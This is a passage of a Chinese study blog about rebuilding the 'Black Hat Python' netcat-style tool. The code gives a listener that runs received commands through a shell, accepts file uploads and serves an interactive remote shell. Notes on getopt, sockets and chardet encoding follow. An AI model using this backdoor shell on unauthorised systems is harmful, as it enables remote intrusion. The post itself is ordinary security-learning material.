punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        \t<span class=\"token comment\"># 现在等待数据回传</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            recv_len <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            response <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">while</span> recv_len<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                data <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                recv_len <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                response <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                <span class=\"token keyword\">if</span> recv_len <span class=\"token operator\">&lt;</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>            <span class=\"token comment\"># 等待更多输入</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>            <span class=\"token comment\"># 这里 python2 使用的是 raw_input ()，在 python3 中取消了此函数，input () 可以起到相同的作用</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">+=</span> <span class=\"token string\">'\\n'</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token comment\"># 发送数据</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>            client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Exception! Exiting.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token comment\"># 关闭连接</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        client<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run_command</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t<span class=\"token comment\"># 处理多余得空格和换行符</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    command <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    \t<span class=\"token comment\"># 先解码，再执行命令</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        command <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        <span class=\"token comment\"># 运行命令并将输出返回</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>        output <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">,</span> stderr<span class=\"token operator\">=</span>subprocess<span class=\"token punctuation\">.</span>STDOUT<span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>        <span class=\"token comment\"># 这里所返回的命令结果都是以系统 shell 默认编码的形式返回。</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        output <span class=\"token operator\">=</span> <span class=\"token string\">b\"Failed to execute command.\\r\\n\"</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token comment\"># 将输出发送</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">return</span> output</pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">client_handler</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t<span class=\"token comment\"># 检测上传文件</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    \t<span class=\"token comment\"># 读取所有都字符并写下目标</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>        file_buffer <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>        <span class=\"token comment\"># 持续读取数据直到没有符合得数据</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>            data <span class=\"token operator\">=</span> client_socket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>                file_buffer <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token comment\"># 现在我们接受这些数据并将他们写出来</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>upload_destination<span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> file_descriptor<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>                file_descriptor<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>file_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>                client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'Successfully saved file to %s'</span> <span class=\"token operator\">%</span> upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'Failed saved file to %s'</span> <span class=\"token operator\">%</span> upload_destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t<span class=\"token comment\"># 检查执行命令</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>execute<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>        output <span class=\"token operator\">=</span> run_command<span class=\"token punctuation\">(</span>execute<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>        client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t<span class=\"token comment\"># 如果需要一个命令行 shell，那么我们进入另一个循环</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token keyword\">if</span> command<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>        \t<span class=\"token comment\"># 跳出一个窗口</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'&lt;BHP:#>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>            cmd_buffer <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>            cmd_buffer <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>cmd_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>            <span class=\"token comment\"># 现在我们接收文件直到发现换行符</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token string\">'\\n'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> cmd_buffer<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>                cmd_buffer <span class=\"token operator\">+=</span> client_socket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>            <span class=\"token comment\"># 返还命令输出</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>            response <span class=\"token operator\">=</span> run_command<span class=\"token punctuation\">(</span>cmd_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            <span class=\"token comment\"># 这里使用 detect 函数进行判断字节编码，并按照结果进行解码。</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            btype <span class=\"token operator\">=</span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>            <span class=\"token keyword\">if</span> btype<span class=\"token punctuation\">[</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'GB2312'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>                response <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>                response <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>            <span class=\"token comment\"># 发送响应数据</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"前提学习\"><a class=\"anchor\" href=\"#前提学习\">#</a> 前提学习</h1>\n<p>没有用过 getopt 库（可之前学了 optparse 库，optparse 也能实现这个功能），于是就去学 getopt 库</p>\n<h2 id=\"getopt库学习\"><a class=\"anchor\" href=\"#getopt库学习\">#</a> getopt 库学习</h2>\n<p>getopt 是一个命令行选项解析器。<br />\ngetopt 的函数之一：<br />\ngetopt.getopt(args, shortopts, longopts=[])</p>\n<ul>\n<li>\n<p>args 为要解析的参数列表，不包含 argv [0]，即：文件名。</p>\n</li>\n<li>\n<p>shortopts 为脚本所要识别的字母选项，如：-h</p>\n</li>\n<li>\n<p>longopts 为一个被支持的长选项名称组成的列表，如：--help</p>\n</li>\n</ul>\n<p>关于 shortopts：<br />\nshortopts 是一个字母；<br />\n它可以写成纯字符：o，也可以写成带一个 - 的形式：-o。<br />\n如果某一个选项后面有参数，那么它的后面就会带一个冒号：o: 或者 - o:。<br />\n当有好几个短操作参数时，可以直接写到一起：'abcd' 或者 '-abcd' 或者 '-ab-c-d'，可随意组合。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>parses <span class=\"token operator\">=</span> <span class=\"token string\">\"-c -p 3306 -h 192.168.1.1 a1 a2\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>optlist<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>parses<span class=\"token punctuation\">,</span> <span class=\"token string\">'cp:h:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>输出</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>>>> optlist</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>[('-c', ''), ('-p', '3306'), ('-h', '192.168.1.1')]</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>>>> args</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>['a1', 'a2']</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>关于 longopts:<br />\nlongopts 必须写在 [] 中，且放在一对单引号中：['--help']<br />\n 如果想承接参数，则要在后面加一个 =：['--help=']<br />\n longopts 必须用逗号隔开，且每个都在一对单引号中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用长选项名的例子：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token string\">'--condition=foo --testing --output-file abc.def -x a1 a2'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'--condition=foo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--testing'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--output-file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc.def'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a2'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> optlist<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'conditions='</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'output-file='</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'testing'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> optlist</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--conditions'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'foo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'--testing'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'--output-file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc.def'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'a1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a2'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>#options 存的是短格式和长格式<br />\n #args 存的是除短格式和长格式之外的，也就是存没有 - 和 -- 的</p>\n<h2 id=\"socket库\"><a class=\"anchor\" href=\"#socket库\">#</a> socket 库</h2>\n<blockquote>\n<p>再复习一下怎么建立 TCP 通信</p>\n</blockquote>\n<h3 id=\"创建一个tcp-client端的流程\"><a class=\"anchor\" href=\"#创建一个tcp-client端的流程\">#</a> 创建一个 TCP client 端的流程</h3>\n<ol>\n<li>创建套接字\n<ul>\n<li>client_s = socket.socket (socket.AF_INET, socket.SOCK_STREAM, 0) 协议号可以省略</li>\n</ul>\n</li>\n<li>建立连接\n<ul>\n<li>client_s.connect((ip, port))</li>\n</ul>\n</li>\n<li>接收数据或者发送数据\n<ol>\n<li>client_s.recv (bufsize)\t接收数据，数据以 bytes 类型返回，bufsize 指定要接收的最大数据量。</li>\n<li>client_s.send ()\t发送数据。返回值是要发送的字节数量。</li>\n<li>client_s.sendall ()\t完整发送数据。将数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。</li>\n</ol>\n</li>\n<li>关闭连接\n<ul>\n<li>client_s.close()</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"创建一个tcp-server端的流程\"><a class=\"anchor\" href=\"#创建一个tcp-server端的流程\">#</a> 创建一个 TCP server 端的流程</h3>\n<ol>\n<li>创建套接字 server_s = socket.socket (socket.AF_INET, socket.SOCK_STREAM, 0)</li>\n<li>把套接字绑定到本地 IP 与端口 server_s.bind ((IP, port))</li>\n<li>设置最大连接数量 server_s.listen (5) 设置你想设置的数字</li>\n<li>等待连接\n<ul>\n<li>server_s.accept ()\t被动接受客户端连接，(阻塞式) 等待连接的到来，并返回（conn,address）二元元组，其中 conn 是一个通信对象，可以用来接收和发送数据。address 是连接客户端的地址。</li>\n</ul>\n</li>\n<li>接收数据或者发送数据\n<ul>\n<li>注意事项：\n<ul>\n<li>Python3 以后，socket 传递的都是 bytes 类型的数据，字符串需要先转换一下，string.encode () 即可；另一端接收到的 bytes 数据想转换成字符串，只要 bytes.decode () 一下就可以。</li>\n<li>在正常通信时，accept () 和 recv () 方法都是阻塞的。所谓的阻塞，指的是程序会暂停在那，一直等到有数据过来。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>关闭连接\n<ul>\n<li>server_s.close()</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"chardet库\"><a class=\"anchor\" href=\"#chardet库\">#</a> chardet 库</h2>\n<p><strong>网上冲浪找到廖雪峰老师的博客</strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMTgzMjU1ODgwMTM0MTQ0\"> https://www.liaoxuefeng.com/wiki/1016959663602400/1183255880134144</span></p>\n<blockquote>\n<p>字符串编码一直是令人非常头疼的问题，尤其是我们在处理一些不规范的第三方网页的时候。虽然 Python 提供了 Unicode 表示的 str 和 bytes 两种数据类型，并且可以通过 encode () 和 decode () 方法转换，但是，在不知道编码的情况下，对 bytes 做 decode () 不好做。</p>\n</blockquote>\n<blockquote>\n<p>对于未知编码的 bytes，要把它转换成 str，需要先 “猜测” 编码。猜测的方式是先收集各种编码的特征字符，根据特征字符判断，就能有很大概率 “猜对”。</p>\n</blockquote>\n<blockquote>\n<p>当然，我们肯定不能从头自己写这个检测编码的功能，这样做费时费力。chardet 这个第三方库正好就派上了用场。用它来检测编码，简单易用。</p>\n</blockquote>\n<h3 id=\"使用chardet\"><a class=\"anchor\" href=\"#使用chardet\">#</a> 使用 chardet</h3>\n<blockquote>\n<p>chardet 的使用非常简单，主模块里面只有一个函数 detect。detect 有一个参数，要求是 bytes 类型。bytes 类型可以通过读取网页内容、open 函数的 rb 模式、带 b 前缀的字符串、encode 函数等途径获得。</p>\n</blockquote>\n<p>当我们拿到一个 bytes 时，就可以对其检测编码。用 chardet 检测编码，只需要一行代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span><span class=\"token string\">b'Hello, world!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'ascii'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'confidence'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1.0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>检测出的编码是 ascii，注意到还有个 confidence 字段，表示检测的概率是 1.0（即 100%）。</p>\n<p><strong>我们来试试检测 GBK 编码的中文：</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> data <span class=\"token operator\">=</span> <span class=\"token string\">'离离原上草，一岁一枯荣'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'GB2312'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'confidence'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.7407407407407407</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Chinese'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>检测的编码是 GB2312，注意到 GBK 是 GB2312 的超集，两者是同一种编码，检测正确的概率是 74%，language 字段指出的语言是 'Chinese'。</p>\n<h3 id=\"decode与encode的区别\"><a class=\"anchor\" href=\"#decode与encode的区别\">#</a> decode 与 encode 的区别</h3>\n<p>这两个函数，一直感觉理解的有些模糊，今天深入研究一下<br />\n 2020 年 12 月 3 日 14:32:14</p>\n<pre><code>encode：编码\ndecode：解码\npython内部编码方式为unicode，decode将其他编码方式转换成unicode编码方式，encode将unicode转换成其他编码方式。\n因此unicode相当于一个中转:\n(1)decode-&gt;unicode-&gt;encode \n(2)encode-&gt;unicode-&gt;decode\n</code></pre>\n<p>字符串在 Python 内部的表示是 unicode 编码，因此，在做编码转换时，通常需要以 unicode 作为中间编码，即先将其他编码的字符串解码（decode）成 unicode，再从 unicode 编码（encode）成另一种编码。</p>\n<p>decode 的作用是将其他编码的字符串转换成 unicode 编码，如 str1.decode ('gb2312')，表示将 gb2312 编码的字符串 str1 转换成 unicode 编码。<br />\nencode 的作用是将 unicode 编码转换成其他编码的字符串，如 str2.encode ('gb2312')，表示将 unicode 编码的字符串 str2 转换成 gb2312 编码。</p>\n<h1 id=\"代码详解\"><a class=\"anchor\" href=\"#代码详解\">#</a> 代码详解</h1>\n<p>这里需要特别注意编码问题，这里引入了个第三方库 chardet 用于解决此类问题，在 linux 系统中默认编码为 utf-8，在 windows 系统中默认编码为 gbk。<br />\nusage (): 用于帮助理解程序的作用以及用法。<br />\nserver_loop (): 服务端主循环，用于接受客户端连接，返还客户端套接字。<br />\nclient_sender ()：用于连接服务端，首先检测是否已经从标准输入中接收数据，如果一切正常，就将数据发送给远程的目标主机并接受回传数据，知道没有更多的数据发送回来，然后再等待用户的下一步输入，并继续发送和接受数据，直到用户结束程序。<br />\nrun_command (): 提供与客户端交互的方法，通过连接将命令结果回传到客户端。<br />\nclient_handler (): 提供上传文件，执行命令，反弹 shell 的功能。<br />\n<s>鸽一段时间<br />\n 2020 年 12 月 2 日 22:56:23<br />\n 没搞完，有时间在搞，非常喜欢用代码去实现一些东西，哎我应该学开发的。。。<br />\n要一心搞 web 安全了。</s><br />\n下图是在 linux 与 windows 上进行程序测试<br />\n图一<img data-src=\"image001.png\" alt=\"\" /><br />\n图二<img data-src=\"image002.png\" alt=\"\" /><br />\n图三<img data-src=\"image003.png\" alt=\"\" /><br />\n图四<img data-src=\"image004.png\" alt=\"\" /></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<blockquote>\n<p>学习到了制作 Unix 和 Linux 